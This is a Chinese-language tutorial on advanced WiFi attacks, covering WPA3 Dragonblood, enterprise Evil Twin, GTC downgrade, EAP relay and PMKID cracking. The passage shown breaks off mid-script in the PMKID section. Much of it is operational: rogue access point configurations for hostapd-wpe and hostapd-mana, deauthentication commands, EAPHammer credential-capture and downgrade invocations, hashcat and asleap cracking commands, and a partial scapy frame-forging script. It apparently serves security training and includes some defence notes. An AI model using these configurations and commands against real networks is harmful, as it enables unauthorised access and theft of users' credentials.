# 高级WiFi攻击技术

> **文档定位**：面向具备WiFi安全基础的学习者，深入探讨现代无线网络的高级攻击技术与防御策略。
> **前置知识**：建议掌握WPA2四次握手、Aircrack-ng工具链、基础无线侦察技术。
> **更新时间**：2026年9月

---

## 目录

1. [WPA3安全分析](#1-wpa3安全分析)
2. [Enterprise WiFi攻击](#2-enterprise-wifi攻击)
3. [WPA3/Enterprise高级攻击工具](#3-wpa3enterprise高级攻击工具)
4. [管理帧安全与MFP绕过](#4-管理帧安全与mfp绕过)
5. [Captive Portal攻击](#5-captive-portal攻击)
6. [KRACK攻击深入](#6-krack攻击深入)
7. [WiFi密码学深入](#7-wifi密码学深入)
8. [高级无线侦察与指纹识别](#8-高级无线侦察与指纹识别)
9. [防御与加固](#9-防御与加固)

---

## 1. WPA3安全分析

### 1.1 WPA3新特性概述

WPA3（Wi-Fi Protected Access 3）是Wi-Fi联盟于2018年发布的第三代Wi-Fi安全标准，旨在解决WPA2中暴露的诸多安全问题。与WPA2相比，WPA3引入了以下核心改进：

#### 1.1.1 SAE（Simultaneous Authentication of Equals）

SAE是WPA3-Personal的核心认证协议，替代了WPA2中的PSK（Pre-Shared Key）认证方式。SAE基于Dragonfly密钥交换协议（RFC 7664），具有以下关键特性：

- **对等认证**：通信双方地位平等，不存在客户端/服务端的角色差异
- **前向保密**：即使长期密钥（密码）泄露，之前的会话密钥仍然安全
- **抗离线字典攻击**：攻击者无法通过捕获的握手包进行离线暴力破解
- **抗主动攻击**：攻击者无法通过交互来加速密码猜测

#### 1.1.2 OWE（Opportunistic Wireless Encryption）

OWE（RFC 8110）提供了"机会主义加密"，用于开放网络（无密码WiFi）。它允许客户端和AP在不预先共享密钥的情况下建立加密连接，防止被动窃听。

- 类似HTTPS对HTTP的升级，但无需证书
- 基于Diffie-Hellman密钥交换
- 不提供身份认证，仅加密数据传输

#### 1.1.3 管理帧保护增强

WPA3要求支持**管理帧保护（Management Frame Protection, MFP）**，即802.11w标准的强制实施：

- 取消认证（Deauthentication）和解除关联（Disassociation）帧受到保护
- 防止简单的取消认证洪泛攻击
- Robust Management Frames (RMF) 包括：Deauthentication、Disassociation、Spectrum Management、QoS、Radio Measurement等

#### 1.1.4 其他增强特性

- **192位加密套件**：WPA3-Enterprise提供可选的192位安全模式，使用GCMP-256、SHA-384、ECDH-P-384、ECDSA-P-384
- **更强大的密钥派生**：使用更安全的密钥派生函数
- **Easy Connect**：简化IoT设备的安全配置流程

---

### 1.2 SAE协议原理深度解析

#### 1.2.1 Dragonfly密钥交换协议

SAE基于Dragonfly协议，这是一种基于密码的认证密钥交换（Password Authenticated Key Exchange, PAKE）协议。其核心思想是：

1. 双方共享一个密码（Password）
2. 通过密码派生一个椭圆曲线上的点（Password Element, PE）
3. 执行类似Diffie-Hellman的密钥交换
4. 最终生成共享密钥PMK（Pairwise Master Key）

#### 1.2.2 SAE握手流程

SAE握手分为两个阶段：**Commit阶段**和**Confirm阶段**。

**Commit消息交换：**

```
客户端 -> AP: Commit(Scalar, Element)
AP -> 客户端: Commit(Scalar, Element)
```

双方各自生成：
- 私钥标量（Scalar）：随机数
- 元素（Element）：对密码派生点进行标量乘法的结果

**Confirm消息交换：**

```
客户端 -> AP: Confirm(Send-Confirm)
AP -> 客户端: Confirm(Send-Confirm)
```

双方验证对方的身份并确认密钥一致性。

#### 1.2.3 密码元素（Password Element）派生

密码元素的派生是SAE安全性的关键。密码被确定性地映射到椭圆曲线上的一个点：

```
PE = KDF(Password, SSID, MAC_AP, MAC_STA)
```

其中KDF是密钥派生函数，使用HMAC和计数器模式。这个过程被称为"hunting and pecking"，因为需要不断尝试直到找到有效的曲线点。

**关键安全特性**：由于PE的派生与双方MAC地址绑定，攻击者即使捕获了Commit消息，也无法离线验证密码猜测——因为每次连接的PE都不同。

---

### 1.3 WPA3-SAE攻击面分析

尽管SAE在设计上比PSK更安全，但它并非完美无缺。以下是已发现的攻击面：

#### 1.3.1 侧信道攻击（Side-Channel Attacks）

**时间侧信道攻击**：
- 密码元素派生过程中的"hunting and pecking"循环次数取决于密码值
- 攻击者可以通过测量响应时间来推断密码信息
- 2019年Dragonblood漏洞披露了此类攻击

**缓存侧信道攻击**：
- 利用CPU缓存泄漏的信息
- 例如Flush+Reload攻击可提取密钥信息

#### 1.3.2 降级攻击

WPA3与WPA2混合模式下的降级攻击是重要攻击面：
- 大多数WPA3 AP同时支持WPA2（过渡模式）
- 攻击者可迫使客户端使用WPA2连接
- 然后使用传统WPA2攻击手段

#### 1.3.3 实现漏洞

不同厂商的SAE实现可能存在漏洞：
- 标量（Scalar）生成的随机性不足
- 密码元素派生的实现缺陷
- Confirm消息验证逻辑错误

#### 1.3.4 主动在线猜测攻击

虽然SAE防止离线字典攻击，但在线猜测仍然可行：
- 攻击者可以尝试不同的密码进行连接
- 每次尝试都需要与AP进行完整的SAE握手
- 速率限制是主要防御手段
- 某些AP实现中速率限制存在绕过可能

---

### 1.4 Dragonblood攻击详解

Dragonblood是2019年由Mathy Vanhoef（KRACK发现者）和Eyal Ronen公开的针对WPA3的系列攻击，共包含5个漏洞。

#### 1.4.1 Dragonblood漏洞概述

| 漏洞编号 | 名称 | 类型 | 影响 |
|---------|------|------|------|
| CVE-2019-9494 | Dragonblood SAE timing attack | 侧信道 | 可恢复密码 |
| CVE-2019-9495 | Dragonblood SAE cache attack | 缓存侧信道 | 可恢复密码 |
| CVE-2019-9496 | Dragonblood SAE downgrade | 降级攻击 | 降级到WPA2 |
| CVE-2019-9497 | Dragonblood EAP-pwd reflection | 反射攻击 | 绕过认证 |
| CVE-2019-9498/9499 | Dragonblood EAP-pwd | 侧信道 | 可恢复密码 |

#### 1.4.2 SAE时间侧信道攻击（CVE-2019-9494）

**攻击原理**：

SAE的密码元素派生使用"hunting and pecking"方法：

```python
def derive_password_element(password, ssid, mac_ap, mac_sta):
    k = 0
    while True:
        pwd_seed = HMAC-SHA256(password, ssid || mac_ap || mac_sta || k)
        x = pwd_seed mod p  # p是椭圆曲线的模数
        # 尝试计算 y^2 = x^3 + ax + b
        if is_quadratic_residue(x):
            return Point(x, y)
        k += 1
```

**攻击方法**：
1. 攻击者作为合法客户端连接AP
2. 尝试不同的密码，测量AP响应Commit消息的时间
3. 密码正确时，派生PE的循环次数不同，导致响应时间有差异
4. 通过大量测量和统计分析，逐步推断密码

**攻击复杂度**：
- 每次密码猜测约需10ms
- 对一个8字符密码，平均需要约350次尝试可区分正确与错误密码
- 实际破解仍需结合字典攻击，但大大减少了尝试次数

#### 1.4.3 SAE缓存侧信道攻击（CVE-2019-9495）

**攻击原理**：

如果攻击者与目标AP共享同一CPU（例如虚拟化环境），可以通过缓存侧信道获取更精确的信息：

1. 使用Flush+Reload技术监控密码派生函数的执行
2. 精确测量循环迭代次数
3. 直接获取密码元素派生过程中的中间值

**攻击场景**：
- 云环境中的虚拟AP
- 共享硬件的多租户环境
- 恶意APP在同一设备上

#### 1.4.4 降级攻击（CVE-2019-9496）

**攻击原理**：

在WPA2/WPA3混合模式下，攻击者可以：

1. 发送伪造的Beacon帧，宣称AP只支持WPA2
2. 或在认证/关联过程中修改RSNE字段，移除WPA3支持
3. 客户端降级到WPA2进行连接
4. 攻击者随后可执行传统WPA2攻击

**实战利用**：

```bash
# 使用hostapd-mana创建降级AP
# 配置文件中只声明WPA2支持
interface=wlan0
ssid=TargetNetwork
wpa=2
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
wpa_passphrase=dummypassword
```

#### 1.4.5 EAP-pwd反射攻击（CVE-2019-9497）

此漏洞影响WPA3-Enterprise使用EAP-pwd认证的场景：

1. 攻击者向客户端发送其自己的Commit消息
2. 客户端返回Confirm消息
3. 攻击者将此Confirm消息原样发回给客户端
4. 由于某些实现中的验证逻辑缺陷，客户端会接受自己的Confirm消息
5. 攻击者成功绕过认证

---

### 1.5 WPA3降级攻击深度分析

#### 1.5.1 降级攻击的分类

**Beacon层降级**：
- 攻击者广播伪造的Beacon，移除WPA3支持标识
- 客户端扫描时发现"目标网络"只支持WPA2
- 适用于被动扫描的客户端

**Probe Response降级**：
- 攻击者响应客户端的Probe Request
- 在Probe Response中只声明WPA2支持
- 适用于主动扫描的客户端

**关联过程降级**：
- 攻击者在AP和客户端之间充当中间人
- 修改Association Request/Response中的RSNE字段
- 需要更复杂的中间人位置

#### 1.5.2 降级攻击的前提条件

1. **混合模式支持**：AP同时支持WPA2和WPA3
2. **客户端兼容性**：客户端同时支持WPA2和WPA3
3. **信号强度优势**：攻击者的信号强于真实AP
4. **无企业级防护**：目标网络未部署WIPS

#### 1.5.3 防御降级攻击的措施

- 禁用WPA2过渡模式，纯WPA3环境
- 客户端配置为仅WPA3模式
- 部署无线入侵防御系统（WIPS）
- 启用管理帧保护（MFP）

---

### 1.6 WPA3与WPA2混合模式攻击

#### 1.6.1 混合模式的安全风险

大多数企业在迁移到WPA3时会采用混合模式（Transition Mode），即AP同时广播WPA2和WPA3支持。这种模式带来了诸多安全问题：

**最弱链接问题**：
- 整体安全性由最弱的连接决定
- 只要有一个客户端使用WPA2连接，网络就存在WPA2级别的漏洞

**攻击面扩大**：
- 同时存在SAE和PSK两个攻击面
- 降级攻击成为可能
- 针对WPA2的所有攻击仍然有效

#### 1.6.2 混合模式下的攻击策略

**策略一：针对WPA2客户端的攻击**
- 识别网络中的WPA2客户端
- 执行传统的WPA2攻击（捕获四次握手、PMKID等）
- 破解密码后，该密码也适用于WPA3连接

**策略二：降级攻击**
- 迫使WPA3客户端降级到WPA2
- 然后执行WPA2攻击

**策略三：SAE侧信道攻击**
- 针对WPA3客户端执行Dragonblood攻击
- 获取密码后可访问整个网络

#### 1.6.3 混合模式的识别

```bash
# 使用airodump-ng识别混合模式AP
airodump-ng wlan0mon --wpa

# 输出中如果同时出现 WPA2 和 WPA3 的RSN信息，则为混合模式
# WPA3标识: RSN: *AKM: 00-0f-ac:8 (SAE)
# WPA2标识: RSN: *AKM: 00-0f-ac:2 (PSK)
```

---

## 2. Enterprise WiFi攻击

### 2.1 802.1X认证体系详解

#### 2.1.1 802.1X架构组成

802.1X是一种端口级网络访问控制协议，在Enterprise WiFi中广泛使用。其架构包含三个核心角色：

**请求者（Supplicant）**：
- 通常是客户端设备（笔记本、手机等）
- 负责向认证系统提供身份凭证
- 运行802.1X客户端软件（如wpa_supplicant、Windows内置客户端）

**认证者（Authenticator）**：
- 通常是无线接入点（AP）或无线控制器
- 作为"守门人"控制对网络的访问
- 在认证完成前，只允许EAP流量通过
- 认证通过后，开放数据通道

**认证服务器（Authentication Server）**：
- 通常是RADIUS服务器
- 存储用户凭证，执行实际的认证逻辑
- 与认证者通过RADIUS协议通信

#### 2.1.2 EAP（Extensible Authentication Protocol）

EAP是802.1X的认证框架，本身不定义具体的认证方法，而是提供一种承载各种认证方法的载体。

**EAP报文结构**：
```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|     Code      |  Identifier   |            Length             |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|    Data ...
+-+-+-+-+-+
```

- **Code**：1=Request, 2=Response, 3=Success, 4=Failure
- **Identifier**：用于匹配请求和响应
- **Length**：整个EAP报文长度
- **Data**：EAP方法特定数据

**常见EAP类型**：
- EAP-TLS：基于证书的双向认证
- PEAP：受保护的EAP，内部嵌套其他EAP方法
- EAP-TTLS：隧道化TLS认证
- EAP-FAST：灵活的安全隧道认证
- EAP-MD5：基于MD5的挑战响应（已不安全）
- EAP-GTC：通用令牌卡
- EAP-SIM/AKA：基于SIM卡的认证

#### 2.1.3 RADIUS协议

RADIUS（Remote Authentication Dial-In User Service）是认证者和认证服务器之间的通信协议：

- 使用UDP协议，端口1812（认证）和1813（计费）
- 支持PAP、CHAP、EAP等认证方式
- 共享密钥（Shared Secret）用于消息完整性和密码加密

**RADIUS认证流程**：
1. Supplicant发送EAPOL-Start
2. Authenticator发送EAP-Request/Identity
3. Supplicant回复EAP-Response/Identity（用户名）
4. Authenticator将其封装为RADIUS Access-Request发送给RADIUS服务器
5. RADIUS服务器根据配置的EAP方法返回挑战
6. 多次EAP消息交换（通过RADIUS封装）
7. 认证成功：RADIUS Access-Accept（包含会话密钥）
8. 认证失败：RADIUS Access-Reject

#### 2.1.4 Enterprise WiFi完整认证流程

```
客户端 (Supplicant)    AP (Authenticator)    RADIUS服务器
        |                    |                       |
        |-- EAPOL-Start ---> |                       |
        |                    |-- EAP-Request/ID ---> |
        |<-- EAP-Resp/ID --- |                       |
        |                    |-- Access-Request ---> |
        |                    |                       |  (EAP协商)
        |<--- EAP-TLS -----> |<--- RADIUS ---------> |
        |    (TLS握手)       |    (封装EAP)          |
        |                    |                       |
        |                    |<-- Access-Accept ---- |
        |                    |    (MSK, EMSK)        |
        |<--- EAP-Success -- |                       |
        |                    |                       |
        |<--- 四次握手 ----> |                       |
        |    (密钥派生)       |                       |
        |<--- 数据通信 ----> |<--- 数据转发 -------->|
```

---

### 2.2 常见EAP类型安全分析

#### 2.2.1 EAP-TLS

**认证机制**：
- 基于TLS的双向证书认证
- 客户端验证服务器证书，服务器验证客户端证书
- 是最安全的EAP方法之一

**安全优势**：
- 双向认证，防止中间人攻击
- 基于证书体系，安全性高
- 不依赖密码，免疫字典攻击

**安全弱点**：
- 证书管理复杂，部署成本高
- 如果客户端不验证服务器证书，存在MITM风险
- 证书吊销机制可能不完善

**攻击面**：
- 证书欺骗（需要有效的CA签名证书）
- TLS版本降级攻击
- 证书验证逻辑绕过

#### 2.2.2 PEAP（Protected EAP）

**认证机制**：
- 外层建立TLS隧道（服务器端证书认证）
- 内层在TLS隧道内执行其他EAP方法（如MSCHAPv2、GTC）
- 只需服务器端证书，部署相对简单

**常见版本**：
- PEAPv0/EAP-MSCHAPv2：最常见，微软主推
- PEAPv1/EAP-GTC：思科主推

**安全优势**：
- 外层TLS保护内层认证凭证
- 部署相对简单，只需服务器证书
- 支持密码认证，用户体验好

**安全弱点**：
- 内层认证方法可能较弱（如MSCHAPv2）
- 如果客户端不验证服务器证书，存在Evil Twin风险
- 证书警告用户常习惯性忽略

#### 2.2.3 EAP-TTLS

**认证机制**：
- 类似PEAP，外层TLS隧道
- 内层支持更多认证方法（PAP、CHAP、MSCHAP、MSCHAPv2、EAP方法等）
- 由Funk Software（现为Juniper）开发

**与PEAP的区别**：
- TTLS标准更开放，PEAP多厂商扩展
- TTLS支持更多内层方法
- 实现细节不同

**安全弱点**：
- 内层PAP认证以明文传输（虽有TLS保护）
- 同样存在证书验证问题
- MSCHAPv2内层认证可被破解

#### 2.2.4 EAP-FAST

**认证机制**：
- 由思科开发，作为LEAP的替代方案
- 使用PAC（Protected Access Credential）替代证书
- 分为三个阶段：
  - Phase 0：PAC配置（可带内或带外）
  - Phase 1：使用PAC建立TLS隧道
  - Phase 2：隧道内的用户认证

**安全优势**：
- 无需证书基础设施，部署成本低
- PAC是预共享凭证，避免证书管理问题
- 支持匿名身份（Outer Identity）

**安全弱点**：
- PAC分发过程可能不安全
- 如果PAC被盗用，攻击者可冒充用户
- Phase 0的带内配置存在MITM风险

---

### 2.3 Evil Twin攻击针对Enterprise网络

#### 2.3.1 Enterprise Evil Twin原理

针对Enterprise网络的Evil Twin攻击比个人网络更复杂，因为Enterprise网络使用802.1X认证。但核心思路一致：

1. 攻击者创建一个与目标网络同名的虚假AP
2. 诱导客户端连接到虚假AP
3. 在认证过程中窃取凭证或执行中间人攻击
4. 将客户端流量转发到真实网络（可选）

#### 2.3.2 Enterprise Evil Twin攻击流程

**步骤1：侦察目标网络**
```bash
# 扫描目标Enterprise网络
airodump-ng wlan0mon --band abg

# 记录：SSID、BSSID、信道、加密方式、EAP类型
```

**步骤2：创建Evil Twin AP**
```bash
# 使用hostapd-wpe创建支持Enterprise的虚假AP
# hostapd-wpe配置示例
interface=wlan0
driver=nl80211
ssid=CorporateWiFi
hw_mode=g
channel=6
ieee8021x=1
eapol_key_index_workaround=0
eap_server=1
eap_user_file=/etc/hostapd-wpe/hostapd.eap_user
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key
private_key_passwd=password
dh_file=/etc/hostapd-wpe/certs/dh
wpa=2
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP
rsn_pairwise=CCMP
```

**步骤3：强制客户端断开连接（可选）**
```bash
# 如果MFP未启用，可发送取消认证帧
aireplay-ng -0 10 -a <目标AP_MAC> -c <客户端_MAC> wlan0mon
```

**步骤4：捕获认证凭证**

当客户端连接到Evil Twin时，根据EAP类型的不同，可获取不同的信息：

- **EAP-MSCHAPv2**：可获取挑战响应哈希，用于离线破解
- **EAP-GTC**：可能获取明文密码（取决于实现）
- **EAP-TLS**：获取客户端证书（但无法冒充，因为没有私钥）
- **EAP-TTLS/PAP**：获取明文密码

**步骤5：凭证破解（针对MSCHAPv2）**
```bash
# 使用asleap破解MSCHAPv2挑战响应
asleap -C <挑战> -R <响应> -W wordlist.txt

# 或使用hashcat
hashcat -m 5500 challenge:response wordlist.txt
```

#### 2.3.3 证书警告绕过

客户端在连接Enterprise网络时通常会验证服务器证书。攻击者需要处理证书验证问题：

**方法一：自签名证书**
- 使用自签名证书，客户端会显示证书警告
- 许多用户会忽略警告并继续连接
- 成功率取决于用户安全意识

**方法二：有效证书**
- 购买或获取有效的SSL证书
- 证书域名匹配EAP域（如果验证域名的话）
- 成本较高，但成功率更高

**方法三：证书颁发机构欺骗**
- 如果内部CA的根证书已安装在客户端上
- 获取子CA证书或利用CA漏洞

---

### 2.4 RADIUS服务器攻击

#### 2.4.1 RADIUS攻击面分析

**网络层攻击**：
- RADIUS使用UDP，易受IP欺骗
- 共享密钥（Shared Secret）是安全关键
- 缺乏速率限制时易受暴力破解

**协议层攻击**：
- PAP密码加密较弱（基于共享密钥的XOR）
- CHAP认证存在已知弱点
- EAP中继攻击

**服务层攻击**：
- 默认共享密钥（如"secret"）
- 弱共享密钥暴力破解
- RADIUS服务器漏洞利用

#### 2.4.2 RADIUS共享密钥攻击

**共享密钥的作用**：
- 生成Request Authenticator的响应验证
- 加密用户密码（PAP）
- 生成Message-Authenticator属性

**暴力破解共享密钥**：
```bash
# 使用radius-attack工具
# 已知用户名和密码时，可验证共享密钥

# 使用John the Ripper
john --format=radius hash.txt wordlist.txt
```

**共享密钥泄露的影响**：
- 可解密捕获的PAP密码
- 可伪造RADIUS请求
- 可绕过认证（某些场景下）

#### 2.4.3 RADIUS属性注入

攻击者如果知道共享密钥，可以：
- 注入VLAN属性，将用户分配到不同VLAN
- 注入超时属性，延长会话时间
- 修改用户权限级别

---

### 2.5 证书欺骗与TLS降级

#### 2.5.1 证书欺骗攻击

在PEAP/EAP-TTLS/EAP-TLS中，服务器证书用于认证服务器身份。如果攻击者能让客户端接受伪造的证书，就能建立TLS隧道并窃取内层凭证。

**证书欺骗的方法**：

1. **自签名证书**：最简单，用户点确认即可
2. **有效第三方证书**：购买合法证书，利用客户端不检查特定字段的漏洞
3. **内部CA证书**：获取企业内部CA的签名
4. **过期/吊销证书**：某些客户端不检查证书有效期
5. **通配符证书滥用**：利用通配符证书匹配多个域名

#### 2.5.2 TLS降级攻击

**攻击原理**：
1. 攻击者在TLS握手过程中修改ClientHello
2. 移除高版本TLS支持，强制使用旧版本
3. 利用旧版本TLS的已知漏洞（如BEAST、POODLE）

**针对EAP的TLS降级**：
- EAP-TLS/PEAP/TTLS都依赖TLS
- 如果降级到SSLv3或TLS 1.0，可利用已知漏洞
- 现代客户端通常禁用了旧版本，但嵌入式设备可能仍支持

#### 2.5.3 实战：证书验证绕过案例

**案例1：Android客户端验证绕过**
- 某些Android版本的EAP客户端不完全验证证书
- 只验证证书链是否有效，不验证域名
- 攻击者可使用任意有效证书

**案例2：Windows PEAP证书名称验证绕过**
- 某些配置下只验证证书是否由受信任CA签发
- 不验证证书中的通用名（CN）是否匹配

---

### 2.6 GTC降级攻击

#### 2.6.1 GTC降级原理

GTC（Generic Token Card）是一种EAP方法，原本用于一次性密码令牌。在PEAPv1中，GTC作为内层认证方法。

**攻击场景**：
- 目标网络使用PEAPv0/EAP-MSCHAPv2
- 攻击者的Evil Twin AP宣称支持PEAPv1/EAP-GTC
- 某些客户端会接受切换到GTC
- 在GTC认证中，客户端发送的密码可能是明文形式

**攻击流程**：
1. 客户端连接到Evil Twin AP
2. AP提议使用PEAPv1/EAP-GTC
3. 客户端接受（如果配置允许）
4. 建立TLS隧道后，内层使用GTC
5. 客户端发送明文密码（或可轻易提取的格式）
6. 攻击者获取明文密码

#### 2.6.2 GTC降级的实现

使用hostapd-wpe配置GTC支持：
```
# hostapd-wpe配置中启用GTC
eap_user_file=/etc/hostapd-wpe/hostapd.eap_user

# hostapd.eap_user中配置
*     PEAP,TTLS,TLS,FAST
"t"   TTLS-MSCHAPV2,MSCHAPV2,MD5,GTC,TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP  "1234test"  [2]
```

#### 2.6.3 防御GTC降级

- 客户端配置为仅使用特定EAP方法
- 启用服务器证书验证
- 禁用不使用的EAP方法

---

### 2.7 EAP中继攻击

#### 2.7.1 攻击原理

EAP中继攻击（EAP Relay / Wireless Man-in-the-Middle）是一种高级攻击方法：

1. 攻击者同时拥有两个无线接口
2. 一个接口作为AP（Evil Twin），与受害者客户端通信
3. 另一个接口作为客户端，与真实AP通信
4. 攻击者在中间中继EAP消息
5. 受害者完成认证后，攻击者获得网络访问权限
6. 攻击者可选择性地转发或篡改流量

#### 2.7.2 与传统Evil Twin的区别

| 特性 | 传统Evil Twin | EAP中继攻击 |
|------|-------------|------------|
| 凭证窃取 | 是（离线破解） | 否（直接中继） |
| 需要密码 | 否（只捕获哈希） | 否（中继认证） |
| 网络访问 | 需要破解后 | 认证后立即可 |
| 检测难度 | 中等 | 高 |
| 双向流量 | 通常单向 | 完全双向 |

#### 2.7.3 攻击工具：eapeak / hostapd-mana

```bash
# 使用hostapd-mana进行EAP中继
# mana.conf 配置示例
interface=wlan0
ssid=TargetEnterprise
hw_mode=g
channel=1
enable_mana=1
mana_loud=1
mana_macacl=0
mana_wpe=1
```

#### 2.7.4 防御EAP中继攻击

- 部署无线入侵检测系统
- 监控同一客户端从不同位置关联的情况
- 使用EAP-TLS双向认证
- 启用通道绑定（Channel Binding）

---

## 3. WPA3/Enterprise高级攻击工具

### 3.1 hcxdumptool与hashcat高级用法

#### 3.1.1 hcxdumptool深度解析

hcxdumptool是新一代WiFi握手包捕获工具，相比传统的aircrack-ng有以下优势：

- 主动发送探测帧，加速握手包获取
- 支持PMKID直接提取（无需完整握手）
- 支持WPA3-SAE握手捕获
- 效率更高，自动处理信道切换
- 生成hashcat直接可用的格式

#### 3.1.2 hcxdumptool核心原理

**PMKID攻击模式**：
- 向AP发送关联请求帧
- AP在关联响应的RSNE中包含PMKID
- PMKID = HMAC-SHA1-128(PMK, "PMK Name" || BSSID || STA_MAC)
- 提取PMKID后可直接用于离线破解
- 无需客户端，无需完整握手

**完整握手捕获**：
- 发送取消认证帧迫使客户端重连
- 捕获四次握手的全部或部分消息
- 支持多种EAPOL消息组合

#### 3.1.3 hcxdumptool实战

```bash
# 基本扫描和捕获
hcxdumptool -i wlan0 -o output.pcapng --enable_status=31

# 只捕获PMKID（最快速）
hcxdumptool -i wlan0 -o pmkid_output.pcapng --enable_status=31 --filtermode=2 --filterlist_ap=target_ap_list.txt

# 针对特定SSID
hcxdumptool -i wlan0 -o capture.pcapng --enable_status=1 --ssid="TargetWiFi"

# 启用SAE/WPA3捕获
hcxdumptool -i wlan0 -o wpa3_capture.pcapng --enable_status=31 --enable_sae=1
```

**状态码说明**（--enable_status）：
- 1 = 显示AP信息
- 2 = 显示客户端信息
- 4 = 显示EAPOL信息
- 8 = 显示PROBE信息
- 16 = 显示运行时统计

#### 3.1.4 hashcat高级用法

**WPA/WPA2哈希格式**：
```
WPA*01*PMKID*MAC_AP*MAC_STA*ESSID***
WPA*02*MIC*MAC_AP*MAC_STA*ESSID*EAPOL_MESSAGE1*EAPOL_MESSAGE2***
```

**常见攻击模式**：
```bash
# 字典攻击
hashcat -m 22000 hash.hc22000 wordlist.txt

# 字典+规则攻击
hashcat -m 22000 hash.hc22000 wordlist.txt -r rules/best64.rule

# 掩码攻击（8位数字密码）
hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d

# 组合攻击
hashcat -m 22000 hash.hc22000 -a 1 left.txt right.txt
```

**性能优化**：
```bash
# 使用GPU加速
hashcat -m 22000 hash.hc22000 wordlist.txt -D 2

# 调整工作负载
hashcat -m 22000 hash.hc22000 wordlist.txt -w 4

# 多哈希并行（多个目标）
hashcat -m 22000 multiple_hashes.hc22000 wordlist.txt
```

#### 3.1.5 hcxtools工具集

```bash
# 转换pcapng为hashcat格式
hcxpcapngtool output.pcapng -o hash.hc22000

# 提取PMKID
hcxpcapngtool output.pcapng --pmkid=pmkid.txt

# 提取EAPOL握手
hcxpcapngtool output.pcapng --eapol=eapol.txt

# 转换为John格式
hcxpcapngtool output.pcapng --john=john.txt

# 显示捕获统计
hcxpcapngtool output.pcapng --csv=report.csv
```

---

### 3.2 EAPHammer工具使用

#### 3.2.1 EAPHammer简介

EAPHammer是一个专门针对Enterprise WiFi的综合攻击工具，由Gabriel Ryan开发。它集成了多种攻击模式：

- Evil Twin AP（支持多种EAP方法）
- 证书欺骗
- GTC降级攻击
- 凭证捕获
- 自动TLS证书生成

#### 3.2.2 EAPHammer安装与配置

```bash
# 克隆仓库
git clone https://github.com/s0lst1c3/eaphammer.git
cd eaphammer

# 运行安装脚本
./kali-setup

# 生成证书
./eaphammer --cert-wizard
```

#### 3.2.3 EAPHammer实战

**基础Evil Twin攻击**：
```bash
./eaphammer -i wlan0 \
    --channel 6 \
    --essid CorporateWiFi \
    --auth wpa-eap \
    --creds
```

**GTC降级攻击**：
```bash
./eaphammer -i wlan0 \
    --channel 6 \
    --essid CorporateWiFi \
    --auth wpa-eap \
    --creds \
    --gtc-downgrade
```

**自动证书生成**：
```bash
./eaphammer --cert-wizard
# 按提示输入组织信息
# 生成的证书用于TLS隧道
```

**捕获的凭证位置**：
- 日志目录：`eaphammer/logs/`
- 凭证文件：`eaphammer/creds/`

#### 3.2.4 EAPHammer高级功能

**Hostile Portal模式**：
- 结合Captive Portal攻击
- 强制用户通过Web页面认证
- 窃取明文凭证

**Captive Portal + Enterprise组合攻击**：
- 先创建开放网络的Captive Portal
- 用户输入企业凭证后，再用这些凭证连接Enterprise网络

---

### 3.3 WPA2/WPA3握手包高级处理

#### 3.3.1 握手包质量评估

**完整的四次握手需要捕获**：
- M1：AP -> STA（ANonce, RSN信息）
- M2：STA -> AP（SNonce, MIC）
- M3：AP -> STA（GTK, MIC）
- M4：STA -> AP（确认MIC）

**可用于破解的最小组合**：
- M1 + M2：最常见，足以计算PTK并验证MIC
- M2 + M3：也可以
- PMKID：无需握手消息

#### 3.3.2 握手包清洗与验证

```bash
# 使用wpaclean清洗握手包
wpaclean clean_output.pcap input.pcap

# 使用aircrack-ng验证
aircrack-ng -w wordlist.txt capture-01.cap

# 使用hcxpcapngtool分析
hcxpcapngtool capture.pcapng --check
```

#### 3.3.3 部分握手包利用

**只有M1 + M2的情况**：
- 可以破解WPA-PSK
- 但无法验证GTK完整性

**只有PMKID的情况**：
- 最精简的破解素材
- 来自AP的关联响应帧
- 无需客户端在线

#### 3.3.4 WPA3-SAE握手包处理

SAE握手包的结构与WPA2完全不同：
- Commit消息替代M1/M2
- Confirm消息替代M3/M4
- 目前离线破解WPA3-SAE非常困难
- 主要价值在于分析和侧信道攻击研究

---

### 3.4 PMKID攻击深入

#### 3.4.1 PMKID原理详解

PMKID（Pairwise Master Key Identifier）是AP在关联响应帧中发送的一个值，用于快速漫游时标识PMK。

**PMKID计算公式**：
```
PMKID = HMAC-SHA1-128(PMK, "PMK Name" || BSSID || STA_MAC)
```

其中：
- `PMK`：Pairwise Master Key（由密码派生）
- `"PMK Name"`：固定字符串
- `BSSID`：AP的MAC地址
- `STA_MAC`：客户端的MAC地址

**为什么可以破解**：
- PMKID是已知值（从帧中提取）
- BSSID和STA_MAC是已知值
- "PMK Name"是固定字符串
- 只有PMK是未知的，而PMK由密码、SSID派生
- 因此可以通过猜测密码来计算PMKID并验证

#### 3.4.2 PMKID攻击的优势

1. **无需客户端**：只需AP在线即可
2. **速度快**：发送一个关联请求即可获取
3. **无需取消认证**：不会干扰正常用户
4. **数据量小**：只需一个帧
5. **成功率高**：只要AP支持RSN，通常就有PMKID

#### 3.4.3 PMKID攻击的限制

1. 仅适用于WPA2/WPA3的RSN网络
2. 某些AP可能不发送PMKID
3. 对于Enterprise网络，PMK由认证服务器生成，PMKID不能直接用于破解密码
4. 无法区分是否启用了MFP

#### 3.4.4 实战：PMKID攻击脚本

```python
# Python示例：手动构造PMKID攻击
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11AssoReq, Dot11Elt, RadioTap

def pmkid_attack(interface, target_bssid, ssid):
    # 构造关联请求帧
    dot11 = Dot11(
        type=0, subtype=0,  # 管理帧, 关联请求
        addr1=target_bssid,
        addr2="00:11:22:33:44:55",  # 伪造的客户端MAC
        addr3=target_bssid
    )
    
    # SSID元素
    ssid_elt = Dot11Elt(ID='SSID', info=ssid)
    
    # RSN元素（声明支持RSN）
    rsn_elt = Dot11Elt(
        ID='RSNinfo',
